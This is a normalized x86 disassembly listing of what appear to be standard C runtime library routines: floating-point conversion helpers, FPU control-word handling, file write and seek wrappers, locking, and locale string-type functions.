cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
xor eax eax
inc eax
retn
sub_4bb37d
mov eax [ esp + 0x8 ]
push esi
push edi
push 0x20
pop ecx
cdq
idiv ecx
mov edi [ esp + 0xc ]
mov esi eax
lea eax [ edi + esi * 4 ]
push eax
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
push edx
push [ eax ]
call sub_4bce4e
add esp 0xc
dec esi
js r-xdata
pop edi
pop esi
retn
lea edi [ edi + esi * 4 ]
push edi
push 0x1
push [ edi ]
call sub_4bce4e
add esp 0xc
dec esi
sub edi 0x4
test esi esi
jge r-xdata
test eax eax
je r-xdata
sub_4bb3ca
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
dec edi
push 0x20
lea eax [ edi + 0x1 ]
pop ecx
cdq
idiv ecx
push 0x1f
pop esi
sub esi edx
xor edx edx
inc edx
mov ecx esi
shl edx cl
mov ebx eax
mov eax [ ebp + 0x8 ]
test [ eax + ebx * 4 ] edx
je r-xdata
or edx 0xffffffff
mov ecx esi
shl edx cl
push 0x3
pop ecx
and [ eax + ebx * 4 ] edx
inc ebx
cmp ebx ecx
jge r-xdata
lea ecx [ edi + 0x1 ]
push ecx
push eax
call sub_4bb34b
test eax eax
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
lea edi [ eax + ebx * 4 ]
sub ecx ebx
xor eax eax
[ edi ]
mov eax [ ebp + 0x8 ]
push edi
push [ ebp + 0x8 ]
call sub_4bb37d
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
sub_4bb43c
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x3
pop edx
sub ecx eax
push esi
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne r-xdata
pop esi
retn
sub_4bb470
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x20
pop esi
cdq
mov ecx esi
idiv ecx
mov ebx [ ebp + 0x8 ]
or edi 0xffffffff
mov [ ebp + 0xc ] esi
mov ecx edx
shl edi cl
mov [ ebp - 0x8 ] eax
xor eax eax
sub [ ebp + 0xc ] edx
not edi
mov [ ebp - 0x4 ] eax
mov esi [ ebx + eax * 4 ]
mov ecx esi
and ecx edi
mov [ ebp - 0xc ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp + 0xc ]
or esi [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] esi
mov esi [ ebp - 0xc ]
shl esi cl
inc eax
cmp eax 0x3
mov [ ebp - 0x4 ] esi
jl r-xdata
push 0x2
pop eax
mov ecx eax
sub ecx [ ebp - 0x8 ]
lea ecx [ ebx + ecx * 4 ]
and [ ebx + eax * 4 ] 0x0
mov edx [ ecx ]
mov [ ebx + eax * 4 ] edx
jmp r-xdata
cmp eax [ ebp - 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
dec eax
sub ecx 0x4
test eax eax
jge r-xdata
sub_4bb4eb
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi ecx
and ecx 0x8000
mov [ ebp + 0x8 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
shl eax 0x10
and edi 0x7fff
sub edi 0x3fff
cmp edi 0xffffc001
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
push eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_4bb43c
push [ esi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_4bb3ca
add esp 0x10
test eax eax
je r-xdata
xor ebx ebx
call sub_4bb457
test eax eax
pop ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx eax
sub ecx [ esi + 0x8 ]
cmp edi ecx
jge r-xdata
inc edi
xor eax eax
lea edi [ ebp - 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
cmp edi eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp esi 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ esi + 0xc ]
mov esi [ esi + 0x10 ]
shl ebx cl
mov ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
or ebx [ ebp - 0xc ]
cmp esi 0x40
jne r-xdata
cmp edi [ esi ]
push [ esi + 0xc ]
jl r-xdata
sub eax edi
mov edi eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_4bb43c
lea eax [ ebp - 0xc ]
push edi
push eax
call sub_4bb470
push [ esi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_4bb3ca
mov eax [ esi + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_4bb470
add esp 0x20
xor ebx ebx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
mov ebx [ esi + 0x14 ]
and [ ebp - 0x9 ] 0x7f
lea eax [ ebp - 0xc ]
push eax
add ebx edi
call sub_4bb470
pop ecx
pop ecx
xor eax eax
lea edi [ ebp - 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x9 ] 0x80
lea eax [ ebp - 0xc ]
push eax
call sub_4bb470
mov ebx [ esi + 0x14 ]
add ebx [ esi ]
pop ecx
xor eax eax
pop ecx
inc eax
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
sub_4bb66f
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_4bd00c
push [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
call sub_4bb643
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
add esp 0x24
call sub_4bb8c9
leave
retn
sub_4bb6b2
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_4bd00c
push [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
call sub_4bb659
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
add esp 0x24
call sub_4bb8c9
leave
retn
sub_4bb6f5
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
mov ecx [ edx + 0xc ]
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
jle r-xdata
and [ eax ] 0x0
test ebx ebx
jl r-xdata
mov [ ebp + 0x8 ] ebx
xor ebx ebx
cmp [ esi ] 0x31
jne r-xdata
cmp [ ecx ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc ecx
jmp r-xdata
push edi
call sub_4b6ec0
inc eax
push eax
push edi
push esi
call sub_4b5890
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ eax ] dl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_4bb76c
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + 0x6 ]
push ebx
push esi
push edi
mov edi 0x7ff
mov esi 0x80000000
mov [ ebp - 0x4 ] esi
mov ecx eax
shr ecx 0x4
and eax 0x8000
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
and eax 0xfffff
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
lea edi [ ecx + 0x3c01 ]
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
lea edi [ ecx + 0x3c00 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov [ eax + 0x8 ] cx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
shl edx 0x1
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
test esi edx
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
test esi ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4bb826
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push esi
mov [ ebp - 0x4 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4bb76c
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_4bd446
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ esi ] eax
movsx eax [ ebp - 0x2c ]
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push edi
call sub_4b7eb0
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
add esp 0x20
mov [ esi + 0xc ] edi
mov eax esi
call sub_4bb8c9
pop edi
pop esi
leave
retn
sub_4bb8e0
xor eax eax
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop eax
test bl 0x8
je r-xdata
or eax 0x8
test bl 0x10
je r-xdata
or eax 0x4
test bl 0x20
je r-xdata
or eax 0x2
test bl 0x2
je r-xdata
or eax 0x1
push ebp
movzx edx bx
push esi
mov ecx edx
mov esi 0xc00
and ecx esi
push edi
mov edi 0x300
mov ebp 0x200
je r-xdata
or eax 0x80000
and edx edi
je r-xdata
cmp ecx 0x400
je r-xdata
or eax 0x20000
cmp edx ebp
jne r-xdata
or eax 0x100
cmp ecx 0x800
je r-xdata
retn
or eax 0x40000
test bh 0x10
pop edi
pop esi
pop ebp
je r-xdata
or eax 0x10000
jmp r-xdata
or eax ebp
jmp r-xdata
cmp ecx esi
jne r-xdata
or eax edi
jmp r-xdata
sub_4bb972
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
test ebx 0x40000
pop esi
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_4bba00
push ebp
mov ebp esp
push ecx
push ebx
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
call sub_4bb8e0
mov ebx eax
mov eax [ ebp + 0xc ]
not eax
and ebx eax
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
or ebx eax
call sub_4bb972
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
mov eax ebx
pop ebx
leave
retn
sub_4bba48
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_4bd8f9
cmp eax 0xffffffff
pop ecx
jne r-xdata
push edi
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_4b8990
mov [ eax ] 0x9
or eax 0xffffffff
pop esi
retn
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
mov eax esi
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_4b89a2
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_4bbabc
push 0xc
push r--data
call sub_4b8944
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jae r-xdata
call sub_4b8990
mov [ eax ] 0x9
call sub_4b8999
and [ eax ] 0x0
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
shl esi 0x2
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_4bd93a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4b8990
mov [ eax ] 0x9
call sub_4b8999
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_4bba48
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_4b897f
retn
or [ ebp - 0x4 ] 0xffffffff
call sub_4bbb43
mov eax [ ebp - 0x1c ]
jmp r-xdata
sub_4bbb67
push ebp
mov ebp esp
sub esp 0x420
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x8 ]
and eax 0x1f
sar ebx 0x5
push esi
lea esi [ eax + eax * 8 ]
lea ebx [ ebx * 4 + rw-data ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push edi
push [ ebp + 0x8 ]
call sub_4bd9cf
add esp 0x10
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop edi
call sub_4bb8c9
leave
retn
push edi
lea ecx [ ebp - 0x1c ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp + 0xc ]
lea eax [ ebp - 0x420 ]
mov [ ebp - 0xc ] edi
mov eax [ ebp - 0x14 ]
cmp eax edi
jne r-xdata
call sub_4b8990
mov [ eax ] 0x1c
call sub_4b8999
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
jne r-xdata
mov edi eax
lea eax [ ebp - 0x420 ]
sub edi eax
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push edi
lea eax [ ebp - 0x420 ]
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x10 ]
inc [ ebp - 0x10 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
sub eax [ ebp - 0x18 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
add [ ebp - 0x14 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x400
jl r-xdata
inc [ ebp - 0x18 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0xc ]
push 0x5
pop esi
cmp [ ebp - 0x8 ] esi
jne r-xdata
pop esi
pop ebx
xor edi edi
mov eax [ ebp - 0x10 ]
sub eax [ ebp + 0xc ]
xor edi edi
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x8 ]
call sub_4b89a2
pop ecx
call sub_4b8990
mov [ eax ] 0x9
call sub_4b8999
mov [ eax ] esi
jmp r-xdata
jmp r-xdata
sub_4bbd0c
push 0xc
push r--data
call sub_4b8944
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jae r-xdata
call sub_4b8990
mov [ eax ] 0x9
call sub_4b8999
and [ eax ] 0x0
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
shl esi 0x2
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_4bd93a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4b8990
mov [ eax ] 0x9
call sub_4b8999
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_4bbb67
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_4b897f
retn
or [ ebp - 0x4 ] 0xffffffff
call sub_4bbd93
mov eax [ ebp - 0x1c ]
jmp r-xdata
sub_4bbdb7
inc [ rw-data ]
push 0x1000
call sub_4b66db
test eax eax
pop ecx
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_4bbdfb
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
movsx eax [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_4bbe25
mov eax [ rw-data ]
test eax eax
push esi
push 0x14
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_4b6bc4
test eax eax
pop ecx
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_4b6bc4
test eax eax
pop ecx
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
xor ecx ecx
mov edx rw-data
or [ edx ] 0xffffffff
test eax eax
jne r-xdata
mov esi ecx
mov eax ecx
and eax 0x1f
sar esi 0x5
mov esi [ esi * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
mov eax [ esi + eax * 4 ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
pop esi
retn
add edx 0x20
inc ecx
cmp edx rw-data
jl r-xdata
sub_4bbee2
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_4b80da
pop ecx
retn
sub_4bbf11
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x10
push eax
call sub_4b80da
pop ecx
retn
sub_4bbf34
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_4b8046
pop ecx
retn
sub_4bbf63
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x10
push eax
call sub_4b8046
pop ecx
retn
sub_4bbf86
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
xor esi esi
cmp ecx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp + 0xc ]
push edx
push esi
push [ eax + 0x28 ]
mov [ ebp + 0xc ] esi
push ecx
push 0x1
lea ecx [ ebp + 0x10 ]
push ecx
push esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax esi
je r-xdata
mov ax [ ebp + 0x10 ]
cmp ax 0xff
ja r-xdata
pop esi
pop ebp
retn
call sub_4b8990
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0xc ] esi
je r-xdata
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
sub_4bc010
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_4bc0a5
push 0x1c
push r--data
call sub_4b8944
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
xor edi edi
inc edi
push edi
push r--data
push edi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
mov ebx [ ebp + 0x1c ]
cmp ebx esi
jne r-xdata
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov edi [ ebp + 0x18 ]
test edi edi
jne r-xdata
mov ebx [ rw-data ]
cmp eax 0x1
jne r-xdata
mov [ rw-data ] 0x2
push ebx
call sub_4bdc56
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi [ rw-data ]
xor eax eax
jmp r-xdata
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
cmp eax edi
je r-xdata
lea esp [ ebp - 0x38 ]
call sub_4b897f
retn
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
xor eax eax
cmp [ ebp + 0x20 ] esi
setne al
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
call [ GetStringTypeA@IAT ]
mov edi eax
test esi esi
je r-xdata
push 0x0
push 0x0
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push edi
call sub_4bdc9f
add esp 0x18
mov esi eax
test esi esi
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + edi ]
mov eax ebx
add eax 0x3
and eax 0xfffffffc
call sub_4b6180
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x2c ] esi
push ebx
push 0x0
push esi
call sub_4ba340
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax edi
push esi
call sub_4b66ed
pop ecx
mov [ ebp + 0xc ] esi
test esi esi
jne r-xdata
push edi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push 0x2
call sub_4b6bc4
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] 0x1
mov eax [ ebp - 0x20 ]
jmp r-xdata
push esi
call sub_4b66ed
pop ecx
sub_4bc25f
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push [ esi + 0x4 ]
call sub_4b66ed
push [ esi + 0x8 ]
call sub_4b66ed
push [ esi + 0xc ]
call sub_4b66ed
push [ esi + 0x10 ]
call sub_4b66ed
push [ esi + 0x14 ]
call sub_4b66ed
push [ esi + 0x18 ]
call sub_4b66ed
push [ esi ]
call sub_4b66ed
push [ esi + 0x20 ]
call sub_4b66ed
push [ esi + 0x24 ]
call sub_4b66ed
push [ esi + 0x28 ]
call sub_4b66ed
push [ esi + 0x2c ]
call sub_4b66ed
push [ esi + 0x30 ]
call sub_4b66ed
push [ esi + 0x34 ]
call sub_4b66ed
push [ esi + 0x1c ]
call sub_4b66ed
push [ esi + 0x38 ]
call sub_4b66ed
push [ esi + 0x3c ]
call sub_4b66ed
add esp 0x40
push [ esi + 0x40 ]
call sub_4b66ed
push [ esi + 0x44 ]
call sub_4b66ed
push [ esi + 0x48 ]
call sub_4b66ed
push [ esi + 0x4c ]
call sub_4b66ed
push [ esi + 0x50 ]
call sub_4b66ed
push [ esi + 0x54 ]
call sub_4b66ed
push [ esi + 0x58 ]
call sub_4b66ed
push [ esi + 0x5c ]
call sub_4b66ed
push [ esi + 0x60 ]
call sub_4b66ed
push [ esi + 0x64 ]
call sub_4b66ed
push [ esi + 0x68 ]
call sub_4b66ed
push [ esi + 0x6c ]
call sub_4b66ed
push [ esi + 0x70 ]
call sub_4b66ed
push [ esi + 0x74 ]
call sub_4b66ed
push [ esi + 0x78 ]
call sub_4b66ed
push [ esi + 0x7c ]
call sub_4b66ed
add esp 0x40
push [ esi + 0x80 ]
call sub_4b66ed
push [ esi + 0x84 ]
call sub_4b66ed
push [ esi + 0x88 ]
call sub_4b66ed
push [ esi + 0x8c ]
call sub_4b66ed
push [ esi + 0x90 ]
call sub_4b66ed
push [ esi + 0x94 ]
call sub_4b66ed
push [ esi + 0x98 ]
call sub_4b66ed
push [ esi + 0x9c ]
call sub_4b66ed
push [ esi + 0xa0 ]
call sub_4b66ed
push [ esi + 0xa4 ]
call sub_4b66ed
push [ esi + 0xa8 ]
call sub_4b66ed
add esp 0x2c
sub_4bc3ef
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
mov ecx [ rw-data ]
cmp eax [ ecx ]
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ rw-data ]
cmp eax [ ecx + 0x4 ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
